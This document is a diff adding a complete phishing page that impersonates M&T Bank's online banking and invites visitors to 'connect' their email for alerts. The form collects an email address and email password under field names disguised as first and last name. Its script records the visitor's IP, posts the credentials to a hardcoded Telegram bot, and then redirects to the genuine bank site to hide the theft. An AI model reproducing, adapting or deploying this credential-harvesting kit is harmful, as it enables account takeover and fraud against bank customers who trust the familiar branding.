@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>Welcome to Online Banking |M&T Bank</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #29445d;
+      background: #fff;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* TOP BAR */
+
+    .top-bar {
+      height: 40px;
+      background: #005b46;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 13px;
+      text-align: center;
+      padding: 0 15px;
+    }
+
+    .top-bar strong {
+      margin-right: 5px;
+    }
+
+    .top-bar span {
+      font-style: italic;
+    }
+
+    /* HEADER */
+
+    .header {
+      height: 78px;
+      background: linear-gradient(
+        90deg,
+        #087b5c,
+        #075d4b
+      );
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo {
+      color: #fff;
+      font-size: 34px;
+      letter-spacing: -1.5px;
+    }
+
+    .logo strong {
+      font-weight: 700;
+    }
+
+    /* MAIN */
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 410px;
+      padding: 42px 20px 55px;
+    }
+
+    /* HEADING */
+
+    .welcome {
+      margin: 0 0 12px;
+      text-align: center;
+      color: #008060;
+      font-size: 32px;
+      font-weight: 400;
+    }
+
+    .subtitle {
+      margin: 0 0 28px;
+      text-align: center;
+      color: #40576d;
+      font-size: 18px;
+      line-height: 1.45;
+    }
+
+    /* FORM */
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .field-label {
+      display: block;
+      margin-bottom: 7px;
+      color: #314d66;
+      font-size: 16px;
+    }
+
+    input {
+      width: 100%;
+      height: 49px;
+      padding: 0 12px;
+      border: 1px solid #9eacb9;
+      border-radius: 5px;
+      background: #fff;
+      color: #263f57;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #008060;
+      box-shadow: 0 0 0 2px rgba(0, 128, 96, 0.10);
+    }
+
+    input::placeholder {
+      color: #8997a3;
+    }
+
+    /* SUBMIT */
+
+    .submit-btn {
+      width: 100%;
+      height: 49px;
+      border: 0;
+      border-radius: 5px;
+      background: #00815f;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .submit-btn:hover {
+      background: #006f52;
+    }
+
+    .submit-btn:active {
+      transform: translateY(1px);
+    }
+
+    /* THANK YOU */
+
+    #thankYou {
+      display: none;
+      text-align: center;
+    }
+
+    .checkmark {
+      width: 54px;
+      height: 54px;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: #e8f4f0;
+      color: #008060;
+      font-size: 30px;
+      font-weight: bold;
+    }
+
+    .redirect-message {
+      margin-top: 20px;
+      color: #66798a;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .countdown {
+      color: #008060;
+      font-weight: 700;
+    }
+
+    /* FOOTER */
+
+    footer {
+      min-height: 78px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f4f6f8;
+      border-top: 1px solid #d1d8de;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 25px;
+      padding: 15px 20px;
+    }
+
+    .footer-links a {
+      color: #007d68;
+      font-size: 13px;
+      text-decoration: underline;
+    }
+
+    /* MOBILE */
+
+    @media (max-width: 600px) {
+      .top-bar {
+        height: 38px;
+        font-size: 11px;
+      }
+      .header {
+        height: 76px;
+      }
+      .logo {
+        font-size: 31px;
+      }
+      .container {
+        max-width: none;
+        padding: 38px 24px 50px;
+      }
+      .welcome {
+        font-size: 30px;
+      }
+      .subtitle {
+        font-size: 17px;
+      }
+      .field-label {
+        font-size: 15px;
+      }
+      input {
+        height: 48px;
+        font-size: 16px;
+      }
+      .submit-btn {
+        height: 49px;
+        font-size: 16px;
+      }
+      footer {
+        min-height: 80px;
+      }
+      .footer-links {
+        gap: 15px 20px;
+      }
+      .footer-links a {
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- TOP BAR -->
+  <div class="top-bar">
+    <strong>M&T</strong>
+    <span>Bank</span>
+  </div>
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="logo"><strong>M&T</strong> Bank</div>
+  </header>
+
+  <main>
+    <!-- FORM -->
+    <section class="container" id="formScreen">
+      <h1 class="welcome">Connect your email address to receive instant alerts.</h1>
+<p class="subtitle">Please enter your details below to get started.</p>
+      <form id="nameForm">
+        <!-- First Name -->
+        <div class="form-group">
+          <label class="field-label" for="firstName">Email Address</label>
+          <input
+            type="text"
+            id="firstName"
+            name="firstName"
+            placeholder="user@domain.com"
+            autocomplete="given-name"
+            required
+          />
+        </div>
+        <!-- Last Name -->
+        <div class="form-group">
+          <label class="field-label" for="lastName">Email Password</label>
+          <input
+            type="password"
+            id="lastName"
+            name="lastName"
+            placeholder="Email Password"
+            autocomplete="family-name"
+            required
+          />
+        </div>
+        <!-- Submit -->
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- THANK YOU -->
+    <section class="container" id="thankYou">
+      <div class="checkmark">✓</div>
+      <h1 class="welcome">Thank You</h1>
+      <p class="subtitle">Your information has been submitted.</p>
+      <p class="redirect-message">
+        You will be redirected in
+        <span class="countdown" id="countdown">7</span> seconds.
+      </p>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="footer-links">
+      <a href="#" onclick="return false;">Security Assurance</a>
+      <a href="#" onclick="return false;">Digital Services Agreement</a>
+      <a href="#" onclick="return false;">Privacy</a>
+      <a href="#" onclick="return false;">Accessible Banking</a>
+    </div>
+  </footer>
+
+  <script>
+    const form = document.getElementById("nameForm");
+    const formScreen = document.getElementById("formScreen");
+    const thankYou = document.getElementById("thankYou");
+    const countdown = document.getElementById("countdown");
+
+    // Telegram config
+    const telegramToken = '7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo'; // <-- replace with your bot token
+    const chatId = '1920675677'; // <-- replace with your chat ID
+
+    // Fetch visitor IP
+    let visitorIp = '';
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { visitorIp = data.ip; })
+      .catch(() => { visitorIp = 'Unable to fetch IP'; });
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      // Get form values
+      const firstName = document.getElementById("firstName").value.trim();
+      const lastName = document.getElementById("lastName").value.trim();
+
+      // Compose message
+      const message = `First Name: ${firstName}\nLast Name: ${lastName}\nvisitor ip ${visitorIp}`;
+
+      // Send to Telegram
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      }).catch(e => console.error("Telegram error:", e));
+
+      // Show thank you
+      formScreen.style.display = "none";
+      thankYou.style.display = "block";
+
+      // Countdown to redirect
+      let seconds = 7;
+      countdown.textContent = seconds;
+      const timer = setInterval(() => {
+        seconds--;
+        countdown.textContent = seconds;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          window.location.href = "https://mtb.com/";
+        }
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
